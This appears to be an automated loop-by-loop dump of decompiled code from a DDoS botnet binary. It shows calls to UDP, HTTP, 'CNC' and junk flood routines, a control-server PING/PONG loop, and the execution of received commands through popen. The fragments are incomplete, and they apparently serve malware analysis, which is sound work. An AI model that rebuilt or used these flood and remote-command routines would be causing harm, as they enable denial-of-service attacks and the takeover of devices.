++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20227 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v232, v240, v241);
		sendSTD(v232, v240, v241);
		sendHOLD(v232, v240, v241);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 139 @ processCmd ====================================
++++++++ WHILE START : 20266 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20278 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
=============================WHILE LOOPS ID : 140 @ processCmd ====================================
++++++++ WHILE START : 20329 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20341 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v232, v240, v241);
		sendSTD(v232, v240, v241);
		sendHOLD(v232, v240, v241);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 141 @ processCmd ====================================
++++++++ WHILE START : 20382 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20392 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v229, v227, v228);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 142 @ processCmd ====================================
++++++++ WHILE START : 20437 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20449 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v232, v240, v241);
		sendSTD(v232, v240, v241);
		sendHOLD(v232, v240, v241);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 143 @ processCmd ====================================
++++++++ WHILE START : 20538 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20547 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v200, v177, v178, v179, v180, v148);
=============================WHILE LOOPS ID : 144 @ processCmd ====================================
++++++++ WHILE START : 20604 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20616 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v232, v240, v241);
		sendSTD(v232, v240, v241);
		sendHOLD(v232, v240, v241);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 145 @ processCmd ====================================
++++++++ WHILE START : 20657 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20667 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v229, v227, v228);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 146 @ processCmd ====================================
++++++++ WHILE START : 20712 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20724 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v232, v240, v241);
		sendSTD(v232, v240, v241);
		sendHOLD(v232, v240, v241);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 147 @ processCmd ====================================
++++++++ WHILE START : 20763 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20775 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
=============================WHILE LOOPS ID : 148 @ processCmd ====================================
++++++++ WHILE START : 20826 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20838 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v232, v240, v241);
		sendSTD(v232, v240, v241);
		sendHOLD(v232, v240, v241);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 149 @ processCmd ====================================
++++++++ WHILE START : 20879 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20889 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v229, v227, v228);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 150 @ processCmd ====================================
++++++++ WHILE START : 20934 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20946 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v232, v240, v241);
		sendSTD(v232, v240, v241);
		sendHOLD(v232, v240, v241);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 151 @ processCmd ====================================
++++++++ WHILE START : 21031 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21043 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v232, v240, v241);
		sendSTD(v232, v240, v241);
		sendHOLD(v232, v240, v241);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 152 @ processCmd ====================================
++++++++ WHILE START : 21077 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21087 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v229, v227, v228);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 153 @ processCmd ====================================
++++++++ WHILE START : 21122 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21134 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v232, v240, v241);
		sendSTD(v232, v240, v241);
		sendHOLD(v232, v240, v241);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 154 @ processCmd ====================================
++++++++ WHILE START : 21170 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21182 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
=============================WHILE LOOPS ID : 155 @ processCmd ====================================
++++++++ WHILE START : 21214 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21224 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v229, v227, v228);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 156 @ processCmd ====================================
++++++++ WHILE START : 21293 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21302 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v200, v177, v178, v179, v180, v148);
=============================WHILE LOOPS ID : 157 @ processCmd ====================================
++++++++ WHILE START : 21340 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21350 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v229, v227, v228);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 158 @ processCmd ====================================
++++++++ WHILE START : 21379 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21391 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
=============================WHILE LOOPS ID : 159 @ processCmd ====================================
++++++++ WHILE START : 21423 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21433 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v229, v227, v228);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 160 @ processCmd ====================================
++++++++ WHILE START : 21492 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21508 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendHOLD(v311, v168, v169);
=============================WHILE LOOPS ID : 161 @ processCmd ====================================
++++++++ WHILE START : 21567 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21577 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v229, v227, v228);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 162 @ processCmd ====================================
++++++++ WHILE START : 21609 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21621 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
=============================WHILE LOOPS ID : 163 @ processCmd ====================================
++++++++ WHILE START : 21663 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21673 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v229, v227, v228);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 164 @ processCmd ====================================
++++++++ WHILE START : 21755 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21764 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v200, v177, v178, v179, v180, v148);
=============================WHILE LOOPS ID : 165 @ processCmd ====================================
++++++++ WHILE START : 21812 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21822 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v229, v227, v228);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 166 @ processCmd ====================================
++++++++ WHILE START : 21854 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21866 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
=============================WHILE LOOPS ID : 167 @ processCmd ====================================
++++++++ WHILE START : 21908 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21918 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v229, v227, v228);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 168 @ processCmd ====================================
++++++++ WHILE START : 21974 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21984 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v199, v171, v172);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 169 @ processCmd ====================================
++++++++ WHILE START : 22038 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22048 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v229, v227, v228);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 170 @ processCmd ====================================
++++++++ WHILE START : 22080 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22092 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
=============================WHILE LOOPS ID : 171 @ processCmd ====================================
++++++++ WHILE START : 22134 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22144 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v229, v227, v228);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 172 @ processCmd ====================================
++++++++ WHILE START : 22226 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22235 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v200, v177, v178, v179, v180, v148);
=============================WHILE LOOPS ID : 173 @ processCmd ====================================
++++++++ WHILE START : 22283 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22293 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v229, v227, v228);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 174 @ processCmd ====================================
++++++++ WHILE START : 22325 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22337 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
=============================WHILE LOOPS ID : 175 @ processCmd ====================================
++++++++ WHILE START : 22379 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22389 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v229, v227, v228);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 176 @ processCmd ====================================
++++++++ WHILE START : 22471 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22481 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v229, v227, v228);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 177 @ processCmd ====================================
++++++++ WHILE START : 22510 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22522 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
=============================WHILE LOOPS ID : 178 @ processCmd ====================================
++++++++ WHILE START : 22554 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22564 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v229, v227, v228);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 179 @ processCmd ====================================
++++++++ WHILE START : 22633 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22642 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v200, v177, v178, v179, v180, v148);
=============================WHILE LOOPS ID : 180 @ processCmd ====================================
++++++++ WHILE START : 22669 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22681 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
=============================WHILE LOOPS ID : 181 @ processCmd ====================================
++++++++ WHILE START : 22724 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22734 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v199, v171, v172);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 182 @ processCmd ====================================
++++++++ WHILE START : 22767 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22779 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
=============================WHILE LOOPS ID : 183 @ processCmd ====================================
++++++++ WHILE START : 22841 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22850 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v200, v177, v178, v179, v180, v148);
=============================WHILE LOOPS ID : 184 @ processCmd ====================================
++++++++ WHILE START : 22877 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22889 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
=============================WHILE LOOPS ID : 185 @ processCmd ====================================
++++++++ WHILE START : 23011 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23023 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
=============================WHILE LOOPS ID : 186 @ processCmd ====================================
++++++++ WHILE START : 23085 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23094 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v200, v177, v178, v179, v180, v148);
=============================WHILE LOOPS ID : 187 @ processCmd ====================================
++++++++ WHILE START : 23121 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23133 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
=============================WHILE LOOPS ID : 188 @ processCmd ====================================
++++++++ WHILE START : 23176 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23186 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v199, v171, v172);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 189 @ processCmd ====================================
++++++++ WHILE START : 23219 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23231 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
=============================WHILE LOOPS ID : 190 @ processCmd ====================================
++++++++ WHILE START : 23293 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23302 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v200, v177, v178, v179, v180, v148);
=============================WHILE LOOPS ID : 191 @ processCmd ====================================
++++++++ WHILE START : 23329 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23341 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
=============================WHILE LOOPS ID : 192 @ processCmd ====================================
++++++++ WHILE START : 23391 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23400 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHOLD(v198, v168, v169);
=============================WHILE LOOPS ID : 193 @ processCmd ====================================
++++++++ WHILE START : 23439 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23451 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
=============================WHILE LOOPS ID : 194 @ processCmd ====================================
++++++++ WHILE START : 23513 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23522 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v200, v177, v178, v179, v180, v148);
=============================WHILE LOOPS ID : 195 @ processCmd ====================================
++++++++ WHILE START : 23549 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23561 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
=============================WHILE LOOPS ID : 196 @ processCmd ====================================
++++++++ WHILE START : 23604 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23614 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v199, v171, v172);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 197 @ processCmd ====================================
++++++++ WHILE START : 23647 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23659 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
=============================WHILE LOOPS ID : 198 @ processCmd ====================================
++++++++ WHILE START : 23721 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23730 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v200, v177, v178, v179, v180, v148);
=============================WHILE LOOPS ID : 199 @ processCmd ====================================
++++++++ WHILE START : 23757 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23769 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
=============================WHILE LOOPS ID : 200 @ getOurIP ====================================
++++++++ WHILE START : 24165 
++++++++ WHILE FUNCTION : getOurIP 
++++++++ WHILE END : 24213 
++++++++ INTRESTING INSTRUCTIONS :  
		if (strstr(v141, "\t00000000\t") == 0) {
		if (fdgets(v141, 0x1000, v139) == 0) {
		while (true) {
		__libc_close(v139);
		__libc_close(v134);
		__libc_close(v134);
=============================WHILE LOOPS ID : 201 @ main ====================================
++++++++ WHILE START : 24566 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 24946 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
		getBuild();
		__GI_inet_ntoa(v126);
		HackerPrint((int32_t)v140, (int32_t)&v150);
		while (true) {
		if (recvLine((int32_t)v140, (char *)&v143, 0x1000) == -1) {
		while (true) {
		v162 = __libc_waitpid(v161, 0, 1);
		while (true) {
		while (true) {
		free(v168);
		if (strstr(v147, "PING") != v147) {
		int32_t v169 = strstr(v147, "DUP"); // 0x8051ab7
		HackerPrint((int32_t)v140, (int32_t)"PONG");
		while (true) {
		v154 = recvLine((int32_t)v153, (char *)&v143, 0x1000);
		while (true) {
		v162 = __libc_waitpid(v161, 0, 1);
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		processCmd(v142, &v196);
		processCmd(v142, &v196);
		if (listFork() == 0) {
		while (true) {
		v154 = recvLine((int32_t)v153, (char *)&v143, 0x1000);
		szprintf(v146, (int32_t)"%s 2>&1", v183);
		int32_t v205 = fdpopen(v146, "r"); // 0x8051cc2
		if (fdgets(v146, 1024, v205) != 0) {
		while (fdgets(v146, 1024, v205) != 0) {
		fdpclose(v205);
		fdpclose(v205);
=============================WHILE LOOPS ID : 202 @ main ====================================
++++++++ WHILE START : 24964 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 24970 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 203 @ main ====================================
++++++++ WHILE START : 24983 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 24990 
++++++++ INTRESTING INSTRUCTIONS :  
		if (recvLine((int32_t)v140, (char *)&v143, 0x1000) != -1) {
=============================WHILE LOOPS ID : 207 @ _vfprintf_internal ====================================
++++++++ WHILE START : 31064 
++++++++ WHILE FUNCTION : _vfprintf_internal 
++++++++ WHILE END : 31692 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 210 @ _ppfs_parsespec ====================================
++++++++ WHILE START : 32644 
++++++++ WHILE FUNCTION : _ppfs_parsespec 
++++++++ WHILE END : 33517 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 216 @ strstr ====================================
++++++++ WHILE START : 34981 
++++++++ WHILE FUNCTION : strstr 
++++++++ WHILE END : 35085 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 217 @ strcasestr ====================================
++++++++ WHILE START : 35796 
++++++++ WHILE FUNCTION : strcasestr 
++++++++ WHILE END : 35857 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 221 @ malloc ====================================
++++++++ WHILE START : 40913 
++++++++ WHILE FUNCTION : malloc 
++++++++ WHILE END : 42891 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		free(v171);
		free(v171);
		free(v171);
		free(v171);
		free(v171);
		free(v171);
		free(v171);
		free(v171);
		free(v171);
		free(v171);
		free(v171);
		free(v171);
		free(v171);
		free(v171);
		free(v171);
		free(v171);
=============================WHILE LOOPS ID : 225 @ __malloc_consolidate ====================================
++++++++ WHILE START : 44334 
++++++++ WHILE FUNCTION : __malloc_consolidate 
++++++++ WHILE END : 44456 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 226 @ abort ====================================
++++++++ WHILE START : 45076 
++++++++ WHILE FUNCTION : abort 
++++++++ WHILE END : 45150 
++++++++ INTRESTING INSTRUCTIONS :  
		__GI_sigprocmask(1, (struct _TYPEDEF_sigset_t *)&v136, 0);
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 227 @ srandom_r ====================================
++++++++ WHILE START : 46353 
++++++++ WHILE FUNCTION : srandom_r 
++++++++ WHILE END : 46391 
++++++++ INTRESTING INSTRUCTIONS :  
		__GI_random_r((int32_t *)v134, (int32_t)&v140);
		__GI_random_r((int32_t *)v134, (int32_t)&v140);
=============================WHILE LOOPS ID : 232 @ sleep ====================================
++++++++ WHILE START : 48000 
++++++++ WHILE FUNCTION : sleep 
++++++++ WHILE END : 48094 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v140 = __GI_sigprocmask(0, (struct _TYPEDEF_sigset_t *)&v136, v139); // 0x80552b3
		while (true) {
		__GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v138, 0);
		__GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v138, 0);
		__GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v138, 0);
=============================WHILE LOOPS ID : 236 @ __stdio_WRITE ====================================
++++++++ WHILE START : 53764 
++++++++ WHILE FUNCTION : __stdio_WRITE 
++++++++ WHILE END : 53831 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 239 @ _fpmaxtostr ====================================
++++++++ WHILE START : 55148 
++++++++ WHILE FUNCTION : _fpmaxtostr 
++++++++ WHILE END : 58309 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 240 @ _fpmaxtostr ====================================
++++++++ WHILE START : 58319 
++++++++ WHILE FUNCTION : _fpmaxtostr 
++++++++ WHILE END : 58418 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 248 @ __GI_strpbrk ====================================
++++++++ WHILE START : 59545 
++++++++ WHILE FUNCTION : __GI_strpbrk 
++++++++ WHILE END : 59594 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 249 @ inet_aton ====================================
++++++++ WHILE START : 59744 
++++++++ WHILE FUNCTION : inet_aton 
++++++++ WHILE END : 59838 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 250 @ __dns_lookup ====================================
++++++++ WHILE START : 60013 
++++++++ WHILE FUNCTION : __dns_lookup 
++++++++ WHILE END : 60759 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_close(-1);
		int32_t v156 = inet_pton(-1, (char *)v148, (int32_t)&v143, (int32_t)&v143); // 0x80569ee
		inet_addr(-1);
		if (socket(-1, v148, (int32_t)&v143) >= 0) {
		if (__libc_connect(-1, v148, (int32_t)&v143) >= 0) {
		__libc_send(-1, v148, (int32_t)&v143, (int32_t)&v143);
		int32_t v165 = __libc_recv(-1, v148, (int32_t)&v143, (int32_t)&v143); // 0x8056ade
		__libc_close(v138);
		free(v139);
		free(v139);
		while (true) {
		while (true) {
		__libc_close(-1);
		free(-1);
		free(-1);
		free(-1);
		free(-1);
		free(-1);
		__libc_close(-1);
		free(-1);
		free(-1);
		free(-1);
		__libc_close(-1);
		free(-1);
		free(-1);
		free(-1);
		free(-1);
		__libc_close(-1);
		free(-1);
		free(-1);
		free(-1);
		__libc_close(-1);
		free(-1);
		free(-1);
		free(-1);
		free(-1);
		__libc_close(-1);
		free(-1);
		free(-1);
		__libc_close(v138);
		free(v139);
		free(v139);
		__libc_close(v138);
		free(v139);
		free(v139);
		__libc_close(v138);
		free(v139);
		free(v139);
		__libc_close(v138);
		free(v139);
		free(v139);
=============================WHILE LOOPS ID : 251 @ __open_nameservers ====================================
++++++++ WHILE START : 61094 
++++++++ WHILE FUNCTION : __open_nameservers 
++++++++ WHILE END : 61115 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fgets(v146, 128, v138) == 0) {
		__GI_fclose((int16_t *)v136);
=============================WHILE LOOPS ID : 252 @ __open_nameservers ====================================
++++++++ WHILE START : 61117 
++++++++ WHILE FUNCTION : __open_nameservers 
++++++++ WHILE END : 61158 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 253 @ __open_nameservers ====================================
++++++++ WHILE START : 61167 
++++++++ WHILE FUNCTION : __open_nameservers 
++++++++ WHILE END : 61282 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 255 @ __open_nameservers ====================================
++++++++ WHILE START : 61331 
++++++++ WHILE FUNCTION : __open_nameservers 
++++++++ WHILE END : 61344 
++++++++ INTRESTING INSTRUCTIONS :  
		free(v184);
=============================WHILE LOOPS ID : 256 @ __open_nameservers ====================================
++++++++ WHILE START : 61395 
++++++++ WHILE FUNCTION : __open_nameservers 
++++++++ WHILE END : 61407 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fgets(v146, 128, v138) != 0) {
		__GI_fclose((int16_t *)v136);
=============================WHILE LOOPS ID : 258 @ __open_nameservers ====================================
++++++++ WHILE START : 61430 
++++++++ WHILE FUNCTION : __open_nameservers 
++++++++ WHILE END : 61441 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fgets(v146, 128, v138) != 0) {
		__GI_fclose((int16_t *)v136);
=============================WHILE LOOPS ID : 259 @ _stdio_openlist_dec_use ====================================
++++++++ WHILE START : 64605 
++++++++ WHILE FUNCTION : _stdio_openlist_dec_use 
++++++++ WHILE END : 64642 
++++++++ INTRESTING INSTRUCTIONS :  
		free(v143);
=============================WHILE LOOPS ID : 261 @ __GI_fgets_unlocked ====================================
++++++++ WHILE START : 65036 
